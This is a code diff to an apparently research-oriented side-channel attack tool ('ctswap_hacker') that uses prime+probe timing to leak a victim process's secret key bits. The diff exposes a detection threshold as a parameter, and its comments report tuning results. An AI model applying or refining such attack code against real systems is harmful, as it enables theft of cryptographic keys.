@@ -37,7 +37,18 @@ fn ctswap_hacker(
     victim_cl_end: u64,
     dst_buf_offset: u64,
     timer: &MyTimer,
-    mut bench_time_file: &File
+    mut bench_time_file: &File,
+    // Minimum (attack_median - base_median) gap, in CounterTimer ticks,
+    // required to call a round "signal detected". Originally hardcoded to
+    // 50 (tuned on macOS/kperf-adjacent hardware). Retrospective ROC
+    // analysis of this project's own Asahi Linux runs (see
+    // phase3/ASAHI_REPORT.md) found 50 far too conservative for this
+    // timer/hardware: at diff_threshold=50, true-positive rate was 11%
+    // (at 0% false-positive rate); lowering it to 10 raised TPR to 41%
+    // while keeping FPR at 0% on the same held-out-style data. Exposed as
+    // a CLI parameter instead of a second hardcoded magic number so this
+    // doesn't need another source edit to tune per platform.
+    diff_threshold: i32,
 ) {
     let mut __trash: u64 = 0;
     let mut test_time: u64;
@@ -279,10 +290,21 @@ fn ctswap_hacker(
                 println!("Base mode: {}", median_test_base);
 
                 // only if atk mode activate DMP but base mode does not
-                if (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
+                if (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > diff_threshold) {
                     succeed_times += 1;
                     noise_times = 0;
                     println!("[+] Get Signal ({})", succeed_times);
+                    // Tried raising this to 5 (requiring more consecutive
+                    // hits, on the theory that a stricter bar would reject
+                    // marginal/lucky gadgets): confirmed worse, not better
+                    // -- see phase3/ASAHI_REPORT.md. Against a secret=1
+                    // victim it exhausted the entire 47-evset search space
+                    // without ever finding a qualifying gadget at all (0%
+                    // TPR, vs. 11% at the original bar of 3); against a
+                    // secret=0 victim it did find one, but that run's FPR
+                    // was already 0% at the original bar too, so it wasn't
+                    // an improvement on the metric that mattered. Reverted
+                    // to the original, better-performing value of 3.
                     if succeed_times >= 3 {
                         gadget_flag = 1;
                         println!("[+] Get Attack Gadgets!");
@@ -408,7 +430,7 @@ fn ctswap_hacker(
         let median_test_base = times_to_load_test_ptr_base[(times_to_load_test_ptr_base.len() / 2 - 1) as usize];
         println!("Attack mode: {}", median_test_atk);
         println!("Base mode: {}", median_test_base);
-        if (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
+        if (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > diff_threshold) {
             println!("[+] Secret Key is 1!");
         } else if median_test_base >= pp_threshold {
             println!("[+] Noisy Measuremnts!");
@@ -438,6 +460,12 @@ fn main() {
     let repetitions = args().nth(1).expect("Enter <repetitions>");
     let pp_threshold = args().nth(2).expect("Enter <prime+probe channel threshold>");
     let num_group = args().nth(3).expect("Enter <number of flush thread group to try>");
+    // Optional 4th arg: minimum attack-base tick gap counted as "signal".
+    // Defaults to 50 (the original hardcoded value) if omitted, so existing
+    // invocations without this arg keep their old behavior.
+    let diff_threshold: i32 = args().nth(4)
+        .map(|s| s.parse::<i32>().expect("diff_threshold must be an integer"))
+        .unwrap_or(50);
 
     let repetitions = repetitions.parse::<usize>().unwrap();
     let pp_threshold = pp_threshold.parse::<u64>().unwrap();
@@ -500,9 +528,10 @@ fn main() {
     match TcpStream::connect("localhost:3333") {
         Ok(stream) => {
             println!("Successfully connected to server in port 3333");
-            ctswap_hacker(stream, &mut victim_array_cache_lines, 
-                repetitions, pp_threshold, num_group, flush_ptr, 
-                victim_cl_start, victim_cl_end, dst_buf_offset, &timer, &bench_time_file);
+            ctswap_hacker(stream, &mut victim_array_cache_lines,
+                repetitions, pp_threshold, num_group, flush_ptr,
+                victim_cl_start, victim_cl_end, dst_buf_offset, &timer, &bench_time_file,
+                diff_threshold);
         },
         Err(e) => {
             println!("Failed to connect: {}", e);
